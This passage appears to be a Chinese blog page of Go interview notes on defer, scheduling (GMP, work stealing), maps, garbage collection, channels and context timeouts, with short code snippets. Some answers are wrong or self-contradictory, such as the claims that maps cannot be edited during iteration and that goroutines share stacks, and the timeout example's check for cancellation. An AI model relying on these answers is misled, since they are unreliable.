href="#defer原理" class="headerlink" title="defer原理"></a>defer原理</h2>defer的原理是先进后出的栈顺序，遇到defer时，将defer后的函数用语句进行压栈处理<h2 id="select原理，多路复用机制"><a href="#select原理，多路复用机制" class="headerlink" title="select原理，多路复用机制"></a>select原理，多路复用机制</h2>监听多个channel，机制是多个case打乱之后轮训</li><li>有多个case执行，随机选一个执行，</li><li>case都不满足，执行default，再不满足就阻塞<h2 id="go的逃逸分析"><a href="#go的逃逸分析" class="headerlink" title="go的逃逸分析"></a>go的逃逸分析</h2></li></ol><p><strong>是在编译过程中的静态分析机制，优化内存分配</strong>用来决定各个变量分配在堆上还是栈上，如果一个变量在函数内部初始化，但是传递到外部了，就说发生逃逸，分配到heap上</p><h2 id="线程模型有哪些？为什么go-scheduler需要实现M：N方案？scheduler-由哪些元素组成"><a href="#线程模型有哪些？为什么go-scheduler需要实现M：N方案？scheduler-由哪些元素组成" class="headerlink" title="线程模型有哪些？为什么go scheduler需要实现M：N方案？scheduler 由哪些元素组成"></a>线程模型有哪些？为什么go scheduler需要实现M：N方案？scheduler 由哪些元素组成</h2><h2 id="解释hand-off，work-stealing"><a href="#解释hand-off，work-stealing" class="headerlink" title="解释hand off，work stealing"></a>解释hand off，work stealing</h2><p>当一个任务队列满，没有空闲的P时，调度器会选择一个空闲的p，直接分配给该处理器执行。</p><ul><li>当一个P执行完自己的任务后，它可以尝试从其他处理器的队列中窃取（steal）一个任务来执行。这样做的目的是使得各个处理器的负载尽量均衡。</li></ul><h2 id="mutex-有几种模式【正常和饥饿】"><a href="#mutex-有几种模式【正常和饥饿】" class="headerlink" title="mutex 有几种模式【正常和饥饿】"></a>mutex 有几种模式【正常和饥饿】</h2><p>正常模式保证了公平竞争，适用于大多数情况，而饥饿模式则优先保证了长时间等待的协程能够获得锁。</p><ul><li>mutex没有提供接口，要引入一个计数器来实现饥饿模式<h2 id="defer和return的先后顺序"><a href="#defer和return的先后顺序" class="headerlink" title="defer和return的先后顺序"></a>defer和return的先后顺序</h2>return先执行获取返回值，然后暂停函数的执行，接下来就按defer的压栈顺序执行defer语句，顺序是后进先出的顺序<h2 id="go-recover的执行时机"><a href="#go-recover的执行时机" class="headerlink" title="go recover的执行时机"></a>go recover的执行时机</h2></li></ul><p><strong>需要进行defer func捕获上级的panic</strong>：<br>recover 必须在 defer 函数中运行。recover 捕获的是祖父级调用时的异常，直接调用时无效。</p><h2 id="闭包错误引用同一个变量问题怎么处理-？"><a href="#闭包错误引用同一个变量问题怎么处理-？" class="headerlink" title="闭包错误引用同一个变量问题怎么处理 ？"></a>闭包错误引用同一个变量问题怎么处理 ？</h2><ol><li>将闭包需要<strong>引用的变量作为参数</strong>传递给闭包函数，而不是直接在闭包内部引用外部变量。</li><li>在闭包函数里创建一个新的临时变量<h2 id="循环内部执行defer会发生什么"><a href="#循环内部执行defer会发生什么" class="headerlink" title="循环内部执行defer会发生什么"></a>循环内部执行defer会发生什么</h2>正常压栈，</li></ol><h2 id="golang中的大端序和小端序"><a href="#golang中的大端序和小端序" class="headerlink" title="golang中的大端序和小端序"></a>golang中的大端序和小端序</h2><p>大端序是低地址存高字节，高地址存低字节，同时也是网络字节序【大端就是顺序从左到右存放】<br>小端时低地址存低字节，高地址存高字节，是主机序【golang默认小端序，主机x86和arm64都是小端】</p><h2 id="syncOnce是什么【确保一个代码块只执行一次，一般用来实现一个线程安全的单例模式】"><a href="#syncOnce是什么【确保一个代码块只执行一次，一般用来实现一个线程安全的单例模式】" class="headerlink" title="syncOnce是什么【确保一个代码块只执行一次，一般用来实现一个线程安全的单例模式】"></a>syncOnce是什么【确保一个代码块只执行一次，一般用来实现一个线程安全的单例模式】</h2><h2 id="routine为什么比thread轻量"><a href="#routine为什么比thread轻量" class="headerlink" title="routine为什么比thread轻量"></a>routine为什么比thread轻量</h2><ol><li>routine是纯用户态调度，非抢占，由runtime管理，创建，切换的开销不需要内核态参与</li><li>协程在同一个地址空间共享堆栈，每个线程都有自己独立的堆栈</li></ol><h2 id="原子操作和锁的区别"><a href="#原子操作和锁的区别" class="headerlink" title="原子操作和锁的区别"></a>原子操作和锁的区别</h2><ol><li>原子操作是对共享变量的单一操作，要么执行完药么全不执行；锁对一段临界区代码，操作的变量可以有一堆</li><li>原子操作开销小，锁开销较大，涉及到上下文切换等<h2 id="go的多返回值如何实现"><a href="#go的多返回值如何实现" class="headerlink" title="go的多返回值如何实现"></a>go的多返回值如何实现</h2><h2 id="uintptr和unsafe-Pointer的区别"><a href="#uintptr和unsafe-Pointer的区别" class="headerlink" title="uintptr和unsafe.Pointer的区别"></a>uintptr和unsafe.Pointer的区别</h2></li></ol><ul><li><strong>uintptr</strong>：将指针转换整数表示，不包含指针的类型信息。</li><li><strong>unsafe.Pointer</strong>：包含任意类型指针，将任意类型的指针转换为通用指针类型，很灵活<br>uintptr 是一个整数类型，它被用于<strong>存储指针的整数表示</strong>形式。<br>使用 uintptr 可以<strong>将指针转换为整数，也可以将整数转换为指针</strong>，但这种转换是不安全的，可能会导致未定义的行为。<br>因为 uintptr 只是整数，<strong>不包含指针的类型信息</strong>，因此在转换后需要谨慎使用，可能会导致类型不匹配或内存安全问题。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p *<span class="keyword">int</span></span><br><span class="line">uintptrValue := <span class="keyword">uintptr</span>(unsafe.Pointer(p))</span><br></pre></td></tr></table></figure><ul><li><strong>unsafe.Pointer</strong><br>unsafe.Pointer 是一个特殊的指针类型，它可以包含任意类型的指针，并允许在不进行类型检查的情况下进行指针操作。<br>使用 unsafe.Pointer 可以将任意类型的指针转换为通用的指针类型，也可以将通用指针转换为具体类型的指针。这种转换也是不安全的，可能会导致未定义的行为。<br>示例：<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p *<span class="keyword">int</span></span><br><span class="line">pointerValue := unsafe.Pointer(p)</span><br></pre></td></tr></table></figure></li></ul><h2 id="switch中如何强制执行下一个case块【fallthrough关键字，忽略后续条件的判断，直接执行下一个-case-的代码】"><a href="#switch中如何强制执行下一个case块【fallthrough关键字，忽略后续条件的判断，直接执行下一个-case-的代码】" class="headerlink" title="switch中如何强制执行下一个case块【fallthrough关键字，忽略后续条件的判断，直接执行下一个 case 的代码】"></a>switch中如何强制执行下一个case块【fallthrough关键字，忽略后续条件的判断，直接执行下一个 case 的代码】</h2><h2 id="如何关闭http响应体"><a href="#如何关闭http响应体" class="headerlink" title="如何关闭http响应体"></a>如何关闭http响应体</h2><p>在defer里close，或者用完就close</p><h2 id="解析json时，默认将数值当作哪种类型【数值默认为float64】"><a href="#解析json时，默认将数值当作哪种类型【数值默认为float64】" class="headerlink" title="解析json时，默认将数值当作哪种类型【数值默认为float64】"></a>解析json时，默认将数值当作哪种类型【数值默认为float64】</h2><h2 id="如何从panic中恢复"><a href="#如何从panic中恢复" class="headerlink" title="如何从panic中恢复"></a>如何从panic中恢复</h2><p>defer func(){ recover()}</p><h2 id="解释一下静态类型声明"><a href="#解释一下静态类型声明" class="headerlink" title="解释一下静态类型声明"></a>解释一下静态类型声明</h2><p>golang生命变量时是<strong>在编译阶段确定类型</strong></p><h2 id="Golang的可变参数是什么，怎么用，要注意什么"><a href="#Golang的可变参数是什么，怎么用，要注意什么" class="headerlink" title="Golang的可变参数是什么，怎么用，要注意什么"></a>Golang的可变参数是什么，怎么用，要注意什么</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sum</span><span class="params">(nums ...<span class="keyword">int</span>)</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    total := nums[<span class="number">0</span>]+<span class="number">10</span></span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line">&#125;</span><br><span class="line">sum()</span><br><span class="line">sum(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p><strong>注意：</strong></p><ol><li>可变参数必须是函数参数列表的最后一个参数：如果函数有多个参数，可变参数必须放在参数列表的最后。</li><li>可变参数可以不传递：如果调用者不传递任何参数，可变参数会被初始化为空切片。</li><li>可变参数可以传递多个值：可以传递任意数量的参数，甚至可以传递零个。</li><li>调用时可以传递切片：如果已经有一个切片，可以在调用函数时使用 … 操作符将其展开为可变参数。<h2 id="golang支持接口的多继承（C-extends-A-and-C）吗【不支持，依靠组合实现】"><a href="#golang支持接口的多继承（C-extends-A-and-C）吗【不支持，依靠组合实现】" class="headerlink" title="golang支持接口的多继承（C extends A and C）吗【不支持，依靠组合实现】"></a>golang支持接口的多继承（C extends A and C）吗【不支持，依靠组合实现】</h2></li></ol><h2 id="简述scheduler函数"><a href="#简述scheduler函数" class="headerlink" title="简述scheduler函数"></a>简述scheduler函数</h2><p>runtime.Gosched()：<br>Gosched() 函数手动触发一次调度，它会将当前 Goroutine 放回队列并让其他等待执行的 Goroutine 有机会运行。这个函数主要用于释放一些处理器资源给其他 Goroutines 使用。</p><h2 id="简述全局运行队列中获取goroutine的时机【其他本地队列中没有可stealing的】"><a href="#简述全局运行队列中获取goroutine的时机【其他本地队列中没有可stealing的】" class="headerlink" title="简述全局运行队列中获取goroutine的时机【其他本地队列中没有可stealing的】"></a>简述全局运行队列中获取goroutine的时机【其他本地队列中没有可stealing的】</h2><h2 id="简述如何从工作线程的本底运行队列中获取routine【运行队列为空时】"><a href="#简述如何从工作线程的本底运行队列中获取routine【运行队列为空时】" class="headerlink" title="简述如何从工作线程的本底运行队列中获取routine【运行队列为空时】"></a>简述如何从工作线程的本底运行队列中获取routine【运行队列为空时】</h2><h2 id="init是什么时候执行的【包初始化阶段，程序开始执行前】"><a href="#init是什么时候执行的【包初始化阶段，程序开始执行前】" class="headerlink" title="init是什么时候执行的【包初始化阶段，程序开始执行前】"></a>init是什么时候执行的【包初始化阶段，程序开始执行前】</h2><h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><h2 id="1-map的key为什么无序，如何处理冲突的【链地址法】"><a href="#1-map的key为什么无序，如何处理冲突的【链地址法】" class="headerlink" title="1. map的key为什么无序，如何处理冲突的【链地址法】"></a>1. map的key为什么无序，如何处理冲突的【链地址法】</h2><p>底层用hash实现的，维护了一个hmap和bmap，bmap是bucket存实际的key，</p><h2 id="2-map可以边遍历边删元素吗【不能】为什么"><a href="#2-map可以边遍历边删元素吗【不能】为什么" class="headerlink" title="2. map可以边遍历边删元素吗【不能】为什么"></a>2. map可以边遍历边删元素吗【不能】为什么</h2><p>线程不安全，删除的时候会导致存储结构发生变化，</p><h2 id="3-float类型可以作为key吗，哪些不可以作为map的key"><a href="#3-float类型可以作为key吗，哪些不可以作为map的key" class="headerlink" title="3. float类型可以作为key吗，哪些不可以作为map的key"></a>3. float类型可以作为key吗，哪些不可以作为map的key</h2><p>从语法上看，是可以的。Go 语言中只要是可比较的类型都可以作为 key。除开 slice，map，functions 这几种类型，其他类型都是 OK 的。具体包括：布尔值、整型、字符串、指针、通道、接口类型、结构体、只包含上述类型的数组。<br><strong>channel 也可以当key</strong>，可以比较</p><h2 id="4-非接口的任意类型都能调用-T方法吗"><a href="#4-非接口的任意类型都能调用-T方法吗" class="headerlink" title="4. 非接口的任意类型都能调用 *T方法吗"></a>4. 非接口的任意类型都能调用 *T方法吗</h2><p>不能吧，至少引用类型不能</p><h2 id="5-map的赋值过程-mapassign"><a href="#5-map的赋值过程-mapassign" class="headerlink" title="5. map的赋值过程 mapassign"></a>5. map的赋值过程 mapassign</h2><p>对 key 计算 hash 值，根据 hash 值按照之前的流程，找到要赋值的位置（可能是插入新 key，也可能是更新老 key），对相应位置进行赋值。</p><h2 id="6-如何实现两种get操作"><a href="#6-如何实现两种get操作" class="headerlink" title="6. 如何实现两种get操作"></a>6. 如何实现两种get操作</h2><p>map重载了两个函数一个带comma的一个不带comma的</p><h2 id="7-map删除一个key，内存会释放吗【不会，要等gc扫描过来】"><a href="#7-map删除一个key，内存会释放吗【不会，要等gc扫描过来】" class="headerlink" title="7. map删除一个key，内存会释放吗【不会，要等gc扫描过来】"></a>7. map删除一个key，内存会释放吗【不会，要等gc扫描过来】</h2><h2 id="8-解析tag怎么实现的"><a href="#8-解析tag怎么实现的" class="headerlink" title="8. 解析tag怎么实现的"></a>8. 解析tag怎么实现的</h2><p>反射实现的，用Field(i).Tag</p><h2 id="map可以取地址吗【不能】"><a href="#map可以取地址吗【不能】" class="headerlink" title="map可以取地址吗【不能】"></a>map可以取地址吗【不能】</h2><p>本身就是一个指向其他地址的指针，会导致编译错误</p><h2 id="9-rune是int32"><a href="#9-rune是int32" class="headerlink" title="9. rune是int32"></a>9. rune是int32</h2><h2 id="10-值receiver-和-指针receiver的区别"><a href="#10-值receiver-和-指针receiver的区别" class="headerlink" title="10. 值receiver 和 指针receiver的区别"></a>10. 值receiver 和 指针receiver的区别</h2><p>值receiver 是创建结构体的一个副本，不修改原始字段的value<br>指针rcver是在原结构体实例上操作</p><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">数值类型：</span><br><span class="line">int：有符号整数类型，根据平台可能为32位或64位。</span><br><span class="line">uint：无符号整数类型，根据平台可能为32位或64位。</span><br><span class="line">int8、int16、int32、int64：分别为8位、16位、32位、64位的有符号整数类型。</span><br><span class="line">uint8、uint16、uint32、uint64：分别为8位、16位、32位、64位的无符号整数类型。</span><br><span class="line">float32、float64：分别为32位和64位的浮点数类型。</span><br><span class="line">complex64、complex128：分别为64位和128位的复数类型。</span><br><span class="line">布尔类型：</span><br><span class="line">bool：表示逻辑值，只能取 true 或 false。</span><br><span class="line">字符串类型：</span><br><span class="line">string：表示一串字符，是不可变的。</span><br><span class="line">字符类型：</span><br><span class="line">rune：表示一个Unicode字符。</span><br><span class="line">错误类型：</span><br><span class="line">error：表示错误的接口类型。</span><br><span class="line">派生类型：</span><br><span class="line">byte：实际上是 uint8 的别名，用于表示一个字节的值。</span><br><span class="line">rune：实际上是 int32 的别名，用于表示一个Unicode字符。</span><br><span class="line">uintptr：用于存储一个指针的值，适用于底层编程。</span><br><span class="line">复合类型：</span><br><span class="line">数组（array）：具有固定长度的、相同类型的元素序列。</span><br><span class="line">切片（slice）：是对数组的一个引用，它可以动态增长。</span><br><span class="line">映射（map）：用于存储键-值对的集合，类似于字典或哈希表。</span><br><span class="line">结构体（struct）：可以包含不同类型的字段。</span><br><span class="line">接口（interface）：定义了一组方法的集合。</span><br><span class="line">通道（channel）：用于在多个goroutine之间传递数据。</span><br></pre></td></tr></table></figure><h2 id="1-什么是协程"><a href="#1-什么是协程" class="headerlink" title="1.什么是协程"></a>1.什么是协程</h2><p>是Golang提供的线程调度的基本单位。</p><ul><li>一个Goroutine会以一个很小的栈启动2KB或4KB，当遇到栈空间不足时，栈会自动伸缩，因此可以轻易实现成千上万个goroutine同时启动。</li><li>每个goroutine（Go程序并发执行的基本单元）都会分配一块独立的栈内存，用于保存函数的局部变量、参数等信息。<h2 id="2-介绍一下channel"><a href="#2-介绍一下channel" class="headerlink" title="2.介绍一下channel"></a>2.介绍一下channel</h2></li><li>channel时go提供的用于并发编程的特殊类型，使 goroutine 之间的进行数据传递和共享，避免了显式的锁机制，比较安全和高效</li></ul><p><strong>Go以通信的手段来共享内存</strong></p><h3 id="new和make"><a href="#new和make" class="headerlink" title="new和make"></a>new和make</h3><p>new返回一个指向某类型指针，make创建slice map channel的实例</p><h3 id="【问题】有缓冲channel和无缓冲channel的区别【阻塞情况，同步异步】"><a href="#【问题】有缓冲channel和无缓冲channel的区别【阻塞情况，同步异步】" class="headerlink" title="【问题】有缓冲channel和无缓冲channel的区别【阻塞情况，同步异步】"></a>【问题】有缓冲channel和无缓冲channel的区别【阻塞情况，同步异步】</h3><ul><li>对于无缓冲区channel:<br>发送的数据如果没有被接收方接收，那么发送方阻塞;如果一直接收不到发送方的数据，接收方阻塞;</li><li>有缓冲的channel:<br>发送方在缓冲区满的时候阻塞，接收方不阻塞; 接收方在缓冲区为空的时候阻塞，发送方不阻塞。</li></ul><h3 id="【问题】channel的等待队列如果写满了，内存占用很高，怎么解决"><a href="#【问题】channel的等待队列如果写满了，内存占用很高，怎么解决" class="headerlink" title="【问题】channel的等待队列如果写满了，内存占用很高，怎么解决"></a>【问题】channel的等待队列如果写满了，内存占用很高，怎么解决</h3><ol><li>读协程可能出现问题，去修改</li><li>限制写操作的并发数量，避免大量写</li><li>使用select和超时机制<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> ch &lt;- value:</span><br><span class="line">    <span class="comment">// 写入成功</span></span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(time.Second):</span><br><span class="line">    <span class="comment">// 超时处理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="【问题】协程泄漏是什么，什么引发的，怎么解决"><a href="#【问题】协程泄漏是什么，什么引发的，怎么解决" class="headerlink" title="【问题】协程泄漏是什么，什么引发的，怎么解决"></a>【问题】协程泄漏是什么，什么引发的，怎么解决</h3><ul><li>程序中创建的某些协程没有被正确地释放或终止（或者发生死锁），从而导致这些协程持续存在并占用资源（阻塞，死锁，无限循环）</li><li><strong>解决方法</strong><ul><li>defer：在需要释放资源的地方使用 defer</li><li>使用go tool trace进行检查<h2 id="3-介绍一下Go语言的内存分配模型：src-runtime-mheap"><a href="#3-介绍一下Go语言的内存分配模型：src-runtime-mheap" class="headerlink" title="3.介绍一下Go语言的内存分配模型：src/runtime/mheap"></a>3.介绍一下Go语言的内存分配模型：src/runtime/mheap</h2></li></ul></li><li>内存分配器：维护一块大的全局内存，每个线程(Golang中为P)维护一块小的私有内存，私有内存不足再从全局申请。</li><li>预申请的内存划分为span（512MB），bitmap（16G），arena（512G堆区域），span和bitmap是管理堆区域，每个页的大小为8KB。<h2 id="4-介绍一下Go的GC机制：以防止内存泄漏"><a href="#4-介绍一下Go的GC机制：以防止内存泄漏" class="headerlink" title="4.介绍一下Go的GC机制：以防止内存泄漏"></a>4.介绍一下Go的GC机制：以防止内存泄漏</h2></li><li>Go使用的是三色标记法，已被引用的被mark表示不可回收，未引用的被回收掉。</li><li>这里的标记由一个管理内存分配的数据结构mspan管理，按内存块维护资源</li><li>mspan这个结构体中，使用allocBits位图表示每个内存块的分配情况，使用gcmarkBits标记内存块被引用的情况</li><li>这里的标记是从<strong>根对象进行递归扫描</strong>记录的，因为存在指针变量和记录的逻辑地址</li><li>标记队列存放待标记的对象，<strong>灰色表示等待，白色未被标记，黑色被标记</strong>，把标记值记录在gcmarkBits中，标记的表示正在被引用<ul><li>白色对象：尚未被访问，处于初始状态。</li><li>灰色对象：已被访问，但其子对象还未被访问。</li><li>黑色对象：已被访问，且其子对象也已被访问。</li></ul></li><li>STW机制：停掉所有的goroutine，专心做垃圾回收，结束后恢复goroutine<h3 id="【问题】对STW的优化是什么？混合写，并发垃圾回收"><a href="#【问题】对STW的优化是什么？混合写，并发垃圾回收" class="headerlink" title="【问题】对STW的优化是什么？混合写，并发垃圾回收"></a>【问题】对STW的优化是什么？混合写，并发垃圾回收</h3>Go 通过在后台运行一个专用的垃圾回收线程，与程序的其他部分并发地进行垃圾回收。</li><li>并发标记</li><li>混合写，将并发标记和 STW 结合起来的阶段。在这个阶段，部分垃圾回收工作会在并发进行，同时也会暂停所有 Goroutine 进行一些必要的 STW 操作。</li><li>并发清理<h3 id="混合写导致的问题，为了减少停顿时间"><a href="#混合写导致的问题，为了减少停顿时间" class="headerlink" title="混合写导致的问题，为了减少停顿时间"></a>混合写导致的问题，为了减少停顿时间</h3></li></ul><ol><li>内存和CPU开销，因为要引入额外元信息</li><li>在某些情况下，混合写屏障可能会导致一些额外的延迟，尤其是对于极短寿命的对象，因为它们在逃逸到堆之前可能会留在栈上</li></ol><h3 id="【问题】根对象是什么"><a href="#【问题】根对象是什么" class="headerlink" title="【问题】根对象是什么"></a>【问题】根对象是什么</h3><p>在Go语言中，<strong>全局变量、栈上的变量以及程序计数器指向的对象</strong>等都被认为是根对象。</p><p>垃圾回收器会从这些根对象出发，逐步遍历所有可以访问到的对象，并标记它们。</p><h3 id="【问题】goroutine-可以无限创建吗，如果创建过多会有什么后果？从GC的角度来考虑"><a href="#【问题】goroutine-可以无限创建吗，如果创建过多会有什么后果？从GC的角度来考虑" class="headerlink" title="【问题】goroutine 可以无限创建吗，如果创建过多会有什么后果？从GC的角度来考虑"></a>【问题】goroutine 可以无限创建吗，如果创建过多会有什么后果？从GC的角度来考虑</h3><p>理论上可以无限创建，取决于操作系统的限制，比如内存大小</p><ul><li>goroutine执行完会产生垃圾，增大gc压力</li><li>标记阶段时会遍历对象，goroutine多了会导致标记的压力增加</li><li>停顿时间变长：需要回收大量的内存，可能会导致垃圾回收器的停顿时间变长<h3 id="【TIPs】在程序中要避免在短时间内产生大量临时对象，以减小垃圾回收的压力。"><a href="#【TIPs】在程序中要避免在短时间内产生大量临时对象，以减小垃圾回收的压力。" class="headerlink" title="【TIPs】在程序中要避免在短时间内产生大量临时对象，以减小垃圾回收的压力。"></a>【TIPs】在程序中要避免在短时间内产生大量临时对象，以减小垃圾回收的压力。</h3></li></ul><h3 id="如何优化STW机制"><a href="#如何优化STW机制" class="headerlink" title="如何优化STW机制"></a>如何优化STW机制</h3><ul><li>混合写屏障：类似于一种开关，在GC的特定时机开启，开启后指针传递时会把指针标记，即 本轮不回收，下次GC时再确定</li><li>辅助GC：新分配的goroutine如果要分配内存，那就去辅助完成一部分gc工作，也就是自己的资源自己挣的感觉</li></ul><h2 id="4-介绍一下GMP"><a href="#4-介绍一下GMP" class="headerlink" title="4.介绍一下GMP"></a>4.介绍一下GMP</h2><ol><li>G : 协程   goroutine</li><li>P : 处理器 processor ： 和M一对一，runtime.Gomaxprocs配置 </li><li>M : 线程   thread    ：runtime.setMaxThreads最大10000个，<ol><li>有一个M阻塞，会创建一个新M</li><li>有M空闲，就回收或睡眠M</li></ol></li></ol><ul><li>线程是运行 goroutine 的实体，调度器的功能是把可运行的 G 分配到工作线程<br>M 上</li><li>全局队列：存放正在等待运行的G</li><li>本地队列：不超过256个G<h2 id="【问题】调度器P的workstealing机制和handoff机制"><a href="#【问题】调度器P的workstealing机制和handoff机制" class="headerlink" title="【问题】调度器P的workstealing机制和handoff机制"></a>【问题】调度器P的workstealing机制和handoff机制</h2></li><li>work stealing<ul><li>当本线程M没有可运行的G时，尝试从其他线程绑定的P中偷G</li><li>当从其他线程偷不到时，从全局队列偷取（为什么？因为全局队列有锁）</li></ul></li><li>hand off<ul><li>当本线程M因为有G阻塞时，会释放自己的P给另一个唤醒/新建的M执行（runtime调度器来做detach）</li></ul></li></ul><h2 id="【问题】go-func-的执行流程"><a href="#【问题】go-func-的执行流程" class="headerlink" title="【问题】go func(){} 的执行流程"></a>【问题】go func(){} 的执行流程</h2><ol><li>创建一个G，优先加入到func所在线程M对应P的本底队列中，满了的话，放在全局队列中</li><li>G运行在M中，如果本地G队列为空，就去其他M P组合去偷</li><li>【问题】当M系统调用结束时，所属的G会尝试获取一个空闲P去执行，并加入到这个P的G队列，如果找不到，就休眠这个M，并将这个G加入到全局队列</li></ol><h2 id="【问题】Go的生命周期-M0，G0是什么"><a href="#【问题】Go的生命周期-M0，G0是什么" class="headerlink" title="【问题】Go的生命周期 M0，G0是什么"></a>【问题】Go的生命周期 M0，G0是什么</h2><p><strong>M0</strong></p><ul><li>M0指程序启动时，编号为0主线程，runtime的M0</li><li>M0负责初始化和启动第一个G</li><li>启动G之后，和其他M地位一样了</li></ul><p><strong>G0</strong></p><ul><li>每次启动一个M，都会有一个G0</li><li>G0仅负责调度其他的G1，G2</li><li>G0本身不执行任何func</li><li>G1执行完，先执行G0，G0再切换其他的G2</li></ul><h3 id="【场景1】G1嵌套创建G3"><a href="#【场景1】G1嵌套创建G3" class="headerlink" title="【场景1】G1嵌套创建G3"></a>【场景1】G1嵌套创建G3</h3><p>保证局部性，G3优先加入G1所在的本底队列，满了的话看场景3</p><h3 id="【场景2】G执行完毕"><a href="#【场景2】G执行完毕" class="headerlink" title="【场景2】G执行完毕"></a>【场景2】G执行完毕</h3><p>执行完毕后，切换G0，G0调度切换下一个G</p><h3 id="【场景3】连续创建多个G导致本地队列满"><a href="#【场景3】连续创建多个G导致本地队列满" class="headerlink" title="【场景3】连续创建多个G导致本地队列满"></a>【场景3】连续创建多个G导致本地队列满</h3><ol><li>对队列头部的一半打乱，放在全局队列</li><li>新创建的G也放在全局队列中</li><li>当前的本底队列变成原来长度的1/2<h3 id="【场景4】唤醒正在休眠的M"><a href="#【场景4】唤醒正在休眠的M" class="headerlink" title="【场景4】唤醒正在休眠的M"></a>【场景4】唤醒正在休眠的M</h3></li></ol><ul><li>什么时候唤醒？调度器自动唤醒，当某个 Goroutine 可以被执行时，当一个被阻塞的 Channel 操作可以继续执行时。</li></ul><p>新M所在的G队列如果为空，称为<strong>自旋线程</strong>，不断寻找G</p><ul><li>由于自旋线程拥有P，handoff机制不会把P给自旋线程<h3 id="【场景5】自旋线程从哪里获取G"><a href="#【场景5】自旋线程从哪里获取G" class="headerlink" title="【场景5】自旋线程从哪里获取G"></a>【场景5】自旋线程从哪里获取G</h3></li><li>首先从全局队列获取</li><li>全局队列如果为空，触发workstealing，从其他队列队尾偷一半<h1 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h1><h2 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h2>strings.Join ≈ strings.Builder &gt; bytes.Buffer &gt; “+” &gt; fmt.Sprintf</li></ul><h2 id="slice中删除具体的值"><a href="#slice中删除具体的值" class="headerlink" title="slice中删除具体的值"></a>slice中删除具体的值</h2><p>移位法最快。</p><p>原地删除，扫描到具体值后，使用<figure class="highlight plain"><figcaption><span>slice[index+1:])```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## b = b[:len(a)] 作用</span><br><span class="line">- 优化边界检查 Bounds Check ELimination</span><br><span class="line">- 在运行时，Go 语言每次都会对 b[i] 做边界检查，看看是否越界了，如果越界了，就 panic。</span><br><span class="line">- 如果加上这一句，Go语言在编译时，能够做一些简单的静态分析，发现 b[i] 是不可能越界的</span><br><span class="line"></span><br><span class="line">## error</span><br><span class="line">【面试问题】如果一个函数的返回值是error，里面执行了多个defer，并且这些defer里面调用了不同的方法，也会返回error，但是这些error的格式是不一样的（比如有一些方法返回的是官方的errors，有一些是业务定义的错误，比如错误码和错误信息）。怎么样能统一处理这些defer的错误并且返回？</span><br><span class="line">- go泛型接收不同error类型，由特殊需求的话，使用断言判断后返回特定信息</span><br><span class="line"></span><br><span class="line">## 【问题】控制goroutine超时退出</span><br><span class="line">- 使用 context 包</span><br><span class="line">```go</span><br><span class="line">func main() &#123;</span><br><span class="line">// 创建一个上下文，设置超时时间为 2 秒</span><br><span class="line">ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)</span><br><span class="line">defer cancel() // 在完成任务后取消上下文以释放资源</span><br><span class="line"></span><br><span class="line">// 在另一个 goroutine 中执行任务</span><br><span class="line">go func() &#123;</span><br><span class="line">// 模拟一个耗时的任务</span><br><span class="line">time.Sleep(3 * time.Second)</span><br><span class="line"></span><br><span class="line">// 判断上下文是否被取消</span><br><span class="line">if ctx.Err() == context.Canceled &#123;</span><br><span class="line">fmt.Println(&quot;Task canceled due to timeout&quot;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">// 等待一段时间，以确保上下文超时</span><br><span class="line">time.Sleep(4 * time.Second)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="【问题】Go语言闭包【让闭包函数拥有一个初始状态，记住了创建时所在的环境，各种变量的值，减少全局变量的使用，在栈区方便回收】"><a 